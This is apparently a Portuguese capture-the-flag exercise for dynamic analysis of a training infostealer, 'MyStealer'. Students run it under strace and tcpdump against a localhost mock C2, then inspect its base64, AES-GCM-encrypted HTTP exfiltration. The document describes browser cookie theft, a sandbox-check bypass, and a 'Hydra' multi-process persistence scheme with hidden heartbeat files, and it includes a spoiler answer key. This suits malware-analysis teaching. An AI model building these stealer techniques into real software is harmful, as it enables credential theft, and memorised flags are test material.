# 🎯 Desafio 02: Análise Dinâmica

**Dificuldade**: ⭐⭐ Médio  
**Pontos**: 70  
**Versão**: v0.3.1 (Stealth Edition)

---

## Objetivo

Execute o malware em ambiente controlado e capture seu comportamento de rede.

## Contexto

No Challenge 01, você aprendeu que análise estática é limitada devido à ofuscação. Agora é hora de **executar o malware** e observar seu comportamento real.

## Pré-requisitos

- Ambiente de lab configurado (Docker ou VM)
- Servidor C2 mock rodando
- Ferramentas de monitoramento instaladas

---

## Tarefas

### Tarefa 1: Preparação do Ambiente (5 pts)

Configure o ambiente de monitoramento:

```bash
# Criar ambiente de lab
touch /tmp/.mystealer_lab

# Iniciar containers
cd lab_environment
docker-compose up -d

# Verificar se C2 está rodando
curl http://localhost:8080/health
```

**Resposta esperada**:
```json
{
  "status": "healthy",
  "timestamp": "...",
  "service": "mystealer-c2-mock",
  "version": "0.3.1",
  "flag": "CTF{c2_mock_healthy_YYYYMMDD}"
}
```

**FLAG**: Copie a flag do campo `flag` na resposta do health check

---

### Tarefa 2: Execução Monitorada (20 pts)

Execute o malware com strace e capture syscalls:

```bash
# Em uma VM ou container de teste
export MYSTEALER_LAB_MODE=1

# Compilar em modo lab
cargo build --features lab-mode

# Executar com strace
strace -f -o /tmp/strace.log ./target/debug/mystealer --skip-checks

# Analisar syscalls de rede
grep -E "connect|sendto|socket" /tmp/strace.log | head -20

# Analisar syscalls de arquivo
grep -E "openat.*chrome\|firefox\|Cookies" /tmp/strace.log | head -20
```

**Perguntas**:
1. Quais portas são acessadas?
2. Quais databases de browser são abertos?
3. Quais diretórios são escaneados?

**FLAG**: `CTF{porta_principal}` (ex: `CTF{8080}`)

---

### Tarefa 3: Captura de Rede (25 pts)

⚠️ **Importante**: O malware agora envia dados via HTTP para o C2!

```bash
# Terminal 1: Iniciar captura
sudo tcpdump -i lo -w /tmp/capture.pcap port 8080 &

# Terminal 2: Executar malware
./target/debug/mystealer --skip-checks

# Parar captura
sudo pkill tcpdump

# Analisar captura
tcpdump -r /tmp/capture.pcap -A 2>/dev/null | head -100

# Ou com Wireshark
wireshark /tmp/capture.pcap
```

**O que procurar**:

1. **Headers HTTP customizados**:
```
X-Session-ID: <UUID>
X-Chunk-Index: <número>
X-Total-Chunks: <número>
```

2. **Payload** (Base64 encoded):
```
POST /collect HTTP/1.1
Host: localhost:8080
Content-Type: application/octet-stream
X-Session-ID: abc123-def456...

<dados em base64>
```

3. **Resposta do C2**:
```json
{
  "status": "received",
  "session_id": "...",
  "flag": "CTF{data_exfiltrated_successfully}"
}
```

**FLAG**: Extraia o valor do header `X-Session-ID` (primeiros 8 caracteres): `CTF{xxxxxxxx}`

---

### Tarefa 4: Análise dos Dados no C2 (20 pts)

Verifique os dados recebidos pelo servidor C2:

```bash
# Listar todas as sessões
curl http://localhost:8080/sessions | jq

# Ver detalhes de uma sessão
curl http://localhost:8080/sessions/{session_id} | jq

# Baixar arquivo de análise (gerado automaticamente)
curl http://localhost:8080/download/{session_id}/data_XXXXXX.bin.analysis.json | jq

# Ver mapeamento Serde
curl http://localhost:8080/serde-mapping | jq
```

**Exemplo de saída de análise**:
```json
{
  "timestamp": "2024-12-17T21:00:00Z",
  "session_id": "abc123-def456",
  "raw_size": 4096,
  "type": "Encrypted",
  "encryption_info": {
    "version": 1,
    "nonce_hex": "...",
    "ciphertext_size": 4000
  },
  "note": "Encrypted data - use decryptor from Challenge 03"
}
```

**FLAG**: Encontre a flag na resposta do endpoint `/collect`: `CTF{data_exfiltrated_successfully}`

---

## Bônus: Análise de Processo (10 pts)

Se o sistema Hydra estiver ativo, você verá múltiplos processos:

```bash
# Executar com Hydra
./target/debug/mystealer --skip-checks --hydra

# Verificar processos (outro terminal)
ps aux | grep mystealer

# Você deve ver:
# - 1 processo Alpha (principal)
# - 1 processo Beta (backup)
# - 1 processo Gamma (backup)

# Monitorar arquivos de heartbeat
watch -n 1 'cat ~/.cache/fontconfig/*.hb 2>/dev/null'
```

**FLAG Bônus**: Quantos processos Hydra estão rodando? `CTF{numero}`

---

## Ferramentas Recomendadas

| Ferramenta | Uso |
|------------|-----|
| `strace` | Trace de syscalls |
| `ltrace` | Trace de library calls |
| `tcpdump` | Captura de rede (CLI) |
| `Wireshark` | Captura de rede (GUI) |
| `curl` / `jq` | Testar endpoints |
| `watch` | Monitorar em tempo real |
| `procmon` | Monitor de processos |

---

## Dicas

1. **Sempre use ambiente isolado** (VM/Container)
2. **Inicie o C2 antes do malware** - senão a exfiltração falha silenciosamente
3. **Use `--skip-checks`** para pular verificações de sandbox
4. **O tráfego é criptografado** - você verá Base64, não texto claro
5. **Campos JSON são curtos** - use `/serde-mapping` para entender

---

## Anatomia de uma Requisição

```
┌─────────────────────────────────────────────────────────────┐
│                     HTTP POST /collect                      │
├─────────────────────────────────────────────────────────────┤
│ Headers:                                                    │
│   Content-Type: application/octet-stream                    │
│   X-Session-ID: 550e8400-e29b-41d4-a716-446655440000       │
│   X-Chunk-Index: 0                                          │
│   X-Total-Chunks: 1                                         │
├─────────────────────────────────────────────────────────────┤
│ Body (Base64):                                              │
│   AQAAAAAAAABhYmNkZWYxMjM0NTY3ODkw...                      │
│   ↓                                                         │
│   [version=1][nonce=12 bytes][encrypted AES-GCM ciphertext]│
└─────────────────────────────────────────────────────────────┘
```

---

## Solução

<details>
<summary>Clique para ver as respostas (SPOILER)</summary>

### Tarefa 1
```bash
curl -s http://localhost:8080/health | jq '.flag'
```
**FLAG**: `CTF{c2_mock_healthy_20241217}` (data varia)

### Tarefa 2
```bash
grep -c "connect" /tmp/strace.log
# Porta 8080 é a principal
```
**FLAG**: `CTF{8080}`

### Tarefa 3
```bash
tcpdump -r /tmp/capture.pcap -A 2>/dev/null | grep "X-Session-ID" | head -1
# Extrair primeiros 8 caracteres do UUID
```
**FLAG**: `CTF{550e8400}` (varia por execução)

### Tarefa 4
```bash
curl -s http://localhost:8080/sessions | jq '.sessions[0].session_id'
# A flag está na resposta do /collect
```
**FLAG**: `CTF{data_exfiltrated_successfully}`

### Bônus
```bash
ps aux | grep -c mystealer
# Com Hydra: 3 processos
```
**FLAG**: `CTF{3}`

</details>

---

## 📊 Resumo de Pontuação

| Tarefa | Pontos |
|--------|--------|
| 1 - Preparação | 5 |
| 2 - Execução Monitorada | 20 |
| 3 - Captura de Rede | 25 |
| 4 - Análise C2 | 20 |
| **Bônus** - Hydra | +10 |
| **Total** | **70 (+10)** |

---

## 🔗 Próximo Challenge

Agora você sabe que os dados são **criptografados**. No Challenge 03, você vai aprender a **descriptografar** usando engenharia reversa!

---

*Atualizado para MyStealer v0.3.1 - Stealth Edition* 🕵️
